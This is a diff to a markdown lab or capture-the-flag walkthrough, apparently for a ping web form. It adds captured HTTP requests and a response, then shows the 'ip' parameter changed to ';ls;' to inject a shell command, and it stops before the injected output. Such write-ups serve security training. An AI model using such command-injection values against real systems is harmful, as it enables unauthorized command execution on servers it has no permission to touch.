@@ -131,6 +131,7 @@ Solution:-
 1) go to target by searching 94.237.55.61:50073  in search bar
 2) youll see an option "PING 127.0.0.  "  , in that add "1" (127.0.0.1) Now you have your local host ip> now hit the "Ping" button
 3) Ping req sent to 127.0.0.1> capture it using Burp interceptor> view request :-
+Request for ping 127.0.0.1
 ```
 POST /ping HTTP/1.1
 Host: 94.237.55.61:50073
@@ -150,6 +151,42 @@ Priority: u=0, i
 
 ip=1
 ```
+response
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Date: Tue, 01 Apr 2025 17:05:30 GMT
+Connection: keep-alive
+Content-Length: 251
 
-change the `ip` parameter's value from `1` to `;ls;`
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
 
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
+
+```
+
+
+Send the Request to repeater then change the `ip` parameter's value from `1` to `;ls;`
+```
+POST /ping HTTP/1.1
+Host: 94.237.55.61:50073
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.55.61:50073/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Origin: http://94.237.55.61:50073
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+ip=;ls;
+```
+response
